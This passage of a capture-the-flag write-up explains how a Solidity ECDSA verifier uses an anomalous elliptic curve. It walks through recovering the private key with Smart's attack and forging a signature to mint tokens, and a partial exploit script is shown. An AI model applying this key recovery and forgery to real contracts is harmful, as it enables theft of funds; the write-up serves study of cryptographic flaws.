&lt;&#x2F;span&gt;&lt;span&gt;        w = addmod(w, p-u1, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        x2 = mulmod(u, w, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        u3 = mulmod(u2, u, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u0 = mulmod(u0, u2, p);
&lt;&#x2F;span&gt;&lt;span&gt;        u0 = addmod(u0, p-w, p);
&lt;&#x2F;span&gt;&lt;span&gt;        t = mulmod(t, u0, p);
&lt;&#x2F;span&gt;&lt;span&gt;        t0 = mulmod(t0, u3, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        y2 = addmod(t, p-t0, p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        z2 = mulmod(u3, v, p);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Add two elliptic curve points in affine coordinates.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function add(uint x0, uint y0, uint x1, uint y1) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint, uint)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint z0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (x0, y0, z0) = addProj(x0, y0, 1, x1, y1, 1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return toAffinePoint(x0, y0, z0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Double an elliptic curve point in affine coordinates.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function twice(uint x0, uint y0) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint, uint)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint z0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (x0, y0, z0) = twiceProj(x0, y0, 1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return toAffinePoint(x0, y0, z0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Multiply an elliptic curve point by a 2 power base (i.e., (2^exp)*P)).
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function multiplyPowerBase2(uint x0, uint y0, uint exp) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint, uint)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        uint base2X = x0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint base2Y = y0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint base2Z = 1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for(uint i = 0; i &amp;lt; exp; i++) {
&lt;&#x2F;span&gt;&lt;span&gt;            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return toAffinePoint(base2X, base2Y, base2Z);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Multiply an elliptic curve point by a scalar.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function multiplyScalar(uint x0, uint y0, uint scalar) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint x1, uint y1)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        if(scalar == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return zeroAffine();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        else if (scalar == 1) {
&lt;&#x2F;span&gt;&lt;span&gt;            return (x0, y0);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        else if (scalar == 2) {
&lt;&#x2F;span&gt;&lt;span&gt;            return twice(x0, y0);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint base2X = x0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint base2Y = y0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint base2Z = 1;
&lt;&#x2F;span&gt;&lt;span&gt;        uint z1 = 1;
&lt;&#x2F;span&gt;&lt;span&gt;        x1 = x0;
&lt;&#x2F;span&gt;&lt;span&gt;        y1 = y0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(scalar%2 == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            x1 = y1 = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        scalar = scalar &amp;gt;&amp;gt; 1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        while(scalar &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            if(scalar%2 == 1) {
&lt;&#x2F;span&gt;&lt;span&gt;                (x1, y1, z1) = addProj(base2X, base2Y, base2Z, x1, y1, z1);
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            scalar = scalar &amp;gt;&amp;gt; 1;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return toAffinePoint(x1, y1, z1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Multiply the curve&amp;#39;s generator point by a scalar.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function multipleGeneratorByScalar(uint scalar) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint, uint)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        return multiplyScalar(gx, gy, scalar);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @dev Validate combination of message, signature, and public key.
&lt;&#x2F;span&gt;&lt;span&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (bool)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; To disambiguate between public key solutions, include comment below.
&lt;&#x2F;span&gt;&lt;span&gt;        if(rs[0] == 0 || rs[0] &amp;gt;= p || rs[1] == 0) {&#x2F;&#x2F; || rs[1] &amp;gt; lowSmax)
&lt;&#x2F;span&gt;&lt;span&gt;            return false;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        if (!isOnCurve(Q[0], Q[1])) {
&lt;&#x2F;span&gt;&lt;span&gt;            return false;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint x1;
&lt;&#x2F;span&gt;&lt;span&gt;        uint x2;
&lt;&#x2F;span&gt;&lt;span&gt;        uint y1;
&lt;&#x2F;span&gt;&lt;span&gt;        uint y2;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint sInv = inverseMod(rs[1], p);
&lt;&#x2F;span&gt;&lt;span&gt;        (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
&lt;&#x2F;span&gt;&lt;span&gt;        (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
&lt;&#x2F;span&gt;&lt;span&gt;        uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (P[2] == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return false;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint Px = inverseMod(P[2], p);
&lt;&#x2F;span&gt;&lt;span&gt;        Px = mulmod(P[0], mulmod(Px, Px, p), p);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return Px % p == rs[0];
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-8&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-8&quot; aria-label=&quot;Anchor link for: solution-8&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Aaah.. Mathematics, Cryptography and Smart contracts and elite combination here. The goal is very clear here we need to call the &lt;code&gt;mint()&lt;&#x2F;code&gt; function with the amount &lt;code&gt;1_000_000 ether&lt;&#x2F;code&gt;.
The challenge for us is to pass the signature verification.&lt;&#x2F;p&gt;
&lt;p&gt;So, what the heck is the math is doing in the solidity smart contract? Well it is an &lt;strong&gt;Elliptic Curve&lt;&#x2F;strong&gt; Cryptography scheme implementation. To be precisely it is a &lt;strong&gt;SECP256R1&lt;&#x2F;strong&gt; curve.&lt;&#x2F;p&gt;
&lt;p&gt;Now, first learn a bit about the &lt;strong&gt;ECC&lt;&#x2F;strong&gt; and how an implementation looks.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;elliptic-curve-cryptography&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#elliptic-curve-cryptography&quot; aria-label=&quot;Anchor link for: elliptic-curve-cryptography&quot;&gt;Elliptic Curve Cryptography&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Elliptic Curve Cryptography (ECC) is an asymmetric cryptographic that provides the same level of security as RSA or discrete logarithm systems
with considerably shorter operands (approximately 160‚Äì256 bit vs. 1024‚Äì3072 bit). An elliptic curve is a special type of polynomial equation. For cryptographic use, we need to consider the curve not over the real numbers but over a finite field.&lt;&#x2F;p&gt;
&lt;p&gt;This is how an ECC equations looks like,&lt;&#x2F;p&gt;
&lt;center&gt; 
&lt;p&gt;\( E:Y^2 = X^3+aX+b \)&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;statemind25&#x2F;statemind_fallout1.png&quot; height = 50% width = 50%&gt;
&lt;&#x2F;center&gt;
&lt;p&gt;There is point P, 2P and a straight line marked on the graph. These are the operations we can perform on Elliptic Curves. Addition of two points (P, Q) will result point R. IF we double the same point (P+P) will result in a 2P. If I did this point addition for &lt;code&gt;n&lt;&#x2F;code&gt; times, i.e, \( Q = n*P \). Now I&#x27;ll give you the values of &lt;code&gt;Q,P&lt;&#x2F;code&gt; can you find what is &lt;code&gt;n&lt;&#x2F;code&gt;? This is where the ECC security lies.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s see how a secure signing and verification process looks like,&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ecdsa-signing-process&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ecdsa-signing-process&quot; aria-label=&quot;Anchor link for: ecdsa-signing-process&quot;&gt;ECDSA Signing Process&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;A user selects a private key \( d \) where \( 1 \leq d &amp;lt; n \) and computes the public key: \( Q = d \cdot G \)&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Compute the message hash \( z \) (typically \( z = H(m) \), using SHA-256).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Select a random integer \( k \) where \( 1 \leq k &amp;lt; n \).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute the elliptic curve point:&lt;&#x2F;p&gt;
&lt;p&gt;\[ (x_1, y_1) = k \cdot G \]&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute the first signature component:&lt;&#x2F;p&gt;
&lt;p&gt;\[ r = x_1 \mod n \]&lt;&#x2F;p&gt;
&lt;p&gt;If \( r = 0 \), choose a new \( k \) and repeat.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute the second signature component:&lt;&#x2F;p&gt;
&lt;p&gt;\[ s = k^{-1} (z + r d) \mod n \]&lt;&#x2F;p&gt;
&lt;p&gt;If \( s = 0 \), choose a new \( k \) and repeat.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The signature is \( (r, s) \).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;ecdsa-verification-process&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ecdsa-verification-process&quot; aria-label=&quot;Anchor link for: ecdsa-verification-process&quot;&gt;ECDSA Verification Process&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Given a signature \( (r, s) \) and public key \( Q \):&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Compute the message hash \( z = H(m) \).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute the modular inverse of \( s \) modulo \( n \):&lt;&#x2F;p&gt;
&lt;p&gt;\[ s^{-1} \mod n \]&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute:&lt;&#x2F;p&gt;
&lt;p&gt;\[ u_1 = z s^{-1} \mod n \]&lt;&#x2F;p&gt;
&lt;p&gt;\[ u_2 = r s^{-1} \mod n \]&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute the elliptic curve point:&lt;&#x2F;p&gt;
&lt;p&gt;\[ (x&#x27;, y&#x27;) = u_1 G + u_2 Q \]&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute \( x&#x27; \mod n \) and check:&lt;&#x2F;p&gt;
&lt;p&gt;\[ x&#x27; \equiv r \mod n \]&lt;&#x2F;p&gt;
&lt;p&gt;If true, the signature is valid.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;attack-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#attack-1&quot; aria-label=&quot;Anchor link for: attack-1&quot;&gt;Attack&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Lets get all the values and point details from the protocol.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fallout&lt;&#x2F;span&gt;&lt;span&gt; :  0xf96C8C1685180b9551f86952992baAA220E7C91C
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Vault&lt;&#x2F;span&gt;&lt;span&gt; :  0x11e44e424A85203E1208097128B9B1e897C8A9A9
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Qx&lt;&#x2F;span&gt;&lt;span&gt; =  228372021298333142209829245091882548944496316312635232236
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Qy&lt;&#x2F;span&gt;&lt;span&gt; =  3693481507636668030082911526987394375826206080991036294396
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt; =  479674765111403080798288599752794621357071126054239970719
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt; =  1839890679886286542886449861618094502587090720247817035647
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gx&lt;&#x2F;span&gt;&lt;span&gt; =  741691539696267564005241324344676638704819822626281227364
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gy&lt;&#x2F;span&gt;&lt;span&gt; =  3102360199939373249439960210926161310269296148717758328237
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span&gt; =  4007911249843509079694969957202343357280666055654537667969
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Enough equtions, now compare the current solidity implementation of the verification process with the above equations.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
&lt;&#x2F;span&gt;&lt;span&gt;    returns (bool)
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; To disambiguate between public key solutions, include comment below.
&lt;&#x2F;span&gt;&lt;span&gt;    if(rs[0] == 0 || rs[0] &amp;gt;= p || rs[1] == 0) {&#x2F;&#x2F; || rs[1] &amp;gt; lowSmax)
&lt;&#x2F;span&gt;&lt;span&gt;        return false;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    if (!isOnCurve(Q[0], Q[1])) {
&lt;&#x2F;span&gt;&lt;span&gt;        return false;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    uint x1;
&lt;&#x2F;span&gt;&lt;span&gt;    uint x2;
&lt;&#x2F;span&gt;&lt;span&gt;    uint y1;
&lt;&#x2F;span&gt;&lt;span&gt;    uint y2;
&lt;&#x2F;span&gt;&lt;span&gt;    uint sInv = inverseMod(rs[1], p);
&lt;&#x2F;span&gt;&lt;span&gt;    (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
&lt;&#x2F;span&gt;&lt;span&gt;    (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
&lt;&#x2F;span&gt;&lt;span&gt;    uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
&lt;&#x2F;span&gt;&lt;span&gt;    if (P[2] == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;        return false;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    uint Px = inverseMod(P[2], p);
&lt;&#x2F;span&gt;&lt;span&gt;    Px = mulmod(P[0], mulmod(Px, Px, p), p);
&lt;&#x2F;span&gt;&lt;span&gt;    return Px % p == rs[0];
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;sInv&lt;&#x2F;code&gt; is computed using &lt;code&gt;mod n&lt;&#x2F;code&gt;. &lt;code&gt;u1(x1, y1)&lt;&#x2F;code&gt; and &lt;code&gt;u2(x1, y1)&lt;&#x2F;code&gt; are also computed over &lt;code&gt;mod n&lt;&#x2F;code&gt; and suprisingly we didn&#x27;t got &lt;code&gt;n&lt;&#x2F;code&gt; value from the protocol. So, something is fishy...&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;n&lt;&#x2F;code&gt; is the order of the curve. We can compute this by doing the following.&lt;&#x2F;p&gt;
&lt;p&gt;\[ Ep = EllipticCurve(GF(p), [a,b]) \]&lt;&#x2F;p&gt;
&lt;p&gt;\[ n = Ep.order()\]&lt;&#x2F;p&gt;
&lt;p&gt;\[ n = 4007911249843509079694969957202343357280666055654537667969\]&lt;&#x2F;p&gt;
&lt;p&gt;Interesting, \[ p == n \]&lt;&#x2F;p&gt;
&lt;p&gt;These kind of ECC curves are called as &lt;strong&gt;Anomalous Curves&lt;&#x2F;strong&gt;. It is easy to solve the ECDLP in linear time when the underlying elliptic curve is anomalous, i.e. when the number of rational points on &lt;code&gt;Fp&lt;&#x2F;code&gt; is equal to the prime number &lt;code&gt;p&lt;&#x2F;code&gt;. There was a research paper named &lt;a href=&quot;https:&#x2F;&#x2F;www.monnerat.info&#x2F;publications&#x2F;anomalous.pdf&quot;&gt;Generating Anomalous Elliptic Curves&lt;&#x2F;a&gt; published on how to do this. This paper explained an attack called &lt;strong&gt;Smart&lt;&#x2F;strong&gt; to solve ECDLP of Anomalous Curves.&lt;&#x2F;p&gt;
&lt;p&gt;So, now with the &lt;strong&gt;Smart&lt;&#x2F;strong&gt; attack we can compute the Private key from the given values. So, once the we compute the Private Key we need to generate the &lt;code&gt;message&lt;&#x2F;code&gt; which we are going to sign and pass to the &lt;code&gt;mint&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;bytes32 message = keccak256(abi.encode(player, 1_000_000 ether));&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now we need to sign the above message with the computed private key and pass the signature to &lt;code&gt;mint()&lt;&#x2F;code&gt; function. That&#x27;s all.&lt;&#x2F;p&gt;
&lt;p&gt;Python script to perform &lt;strong&gt;Smart Attack&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;fall.py&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# https:&#x2F;&#x2F;mslc.ctf.su&#x2F;wp&#x2F;polictf-2012-crypto-500&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# https:&#x2F;&#x2F;ctftime.org&#x2F;writeup&#x2F;29700
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# https:&#x2F;&#x2F;giacomopope.com&#x2F;hsctf-2019&#x2F;#spooky-ecc
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4007911249843509079694969957202343357280666055654537667969
&lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;479674765111403080798288599752794621357071126054239970719 
&lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1839890679886286542886449861618094502587090720247817035647
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Ep &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;EllipticCurve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(p)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;[a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;b])
&lt;&#x2F;span&gt;&lt;span&gt;G &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;741691539696267564005241324344676638704819822626281227364&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3102360199939373249439960210926161310269296148717758328237&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;Q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228372021298333142209829245091882548944496316312635232236&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3693481507636668030082911526987394375826206080991036294396&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Ep&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;Fn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;FiniteField&lt;&#x2F;span&gt;&lt;span&gt;(n)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;19666107331951626476415026567086342074650612991336538073686539593437448590271
&lt;&#x2F;span&gt;&lt;span&gt;
